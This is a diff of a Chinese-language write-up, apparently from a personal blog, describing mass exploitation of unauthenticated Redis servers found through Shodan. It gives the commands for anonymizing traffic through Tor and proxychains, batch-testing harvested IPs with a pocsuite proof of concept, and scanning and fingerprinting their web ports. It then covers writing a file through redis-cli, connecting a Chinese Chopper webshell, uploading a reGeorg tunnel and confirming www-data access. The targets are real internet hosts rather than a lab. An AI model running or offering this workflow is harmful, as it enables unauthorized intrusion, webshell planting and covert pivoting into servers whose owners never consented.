@@ -92,18 +92,16 @@ available databases [2]:
 [*] information_schema
 
 ```
-#### 子域名挖掘
-	无
+
 # 对redis未授权访问漏洞利用测试
 ### 代理
 配置proxychains使用tor网络，开启ss-server进程：
 
 > proxychains ss-server -c tor_config.json -f pid 2
 
-<div class="divider"></div>
-
 ### 通过shodan提供的API:
 > 账户权限不够，只能获取前100条数据进行测试。
+
 ```python
 api = shodan.Shodan('apikey')
 try:
@@ -117,7 +115,9 @@ try:
 except shodan.APIError as e:
 	print(e)
 ```
+
 ### 测试是否存在redis未授权
+
 > pocsuite -f redis_ip.txt -r redis_poc.py -proxy 127.0.0.1:1080 
 
 #### 利用POC:
@@ -194,10 +194,14 @@ register(TestPOC)
 ### 探测是否开放80端口
 > nmap -Pn -sS -p80,443,8080, -iL redis_success_ip.txt -oX ./redis_http_ip.xml
 
-#### 使用脚本枚举绝对路径,exp：https://github.com/Xyntax/POC-T/blob/master/script/redis-web-probe.py
+#### 使用脚本枚举绝对路径
+exp：https://github.com/Xyntax/POC-T/blob/master/script/redis-web-probe.py
+
 ![path](https://nanazeven.github.io/image/path.png)
 #### 批量识别指纹
+
 > whatweb --no-error -i redis_http.txt --log-brief=res_out
+
 #### 手动连接测试
 ```code
 proxychians redis-cli -h ip:6379
@@ -211,7 +215,9 @@ save
 
 #### 连接菜刀&上传端口转发脚本&查看权限
 使用SocksCap64启动caodao.exe
+
 > 端口转发脚本：https://github.com/sensepost/reGeorg
+
 ```
 $ whoami 
 $ www-data
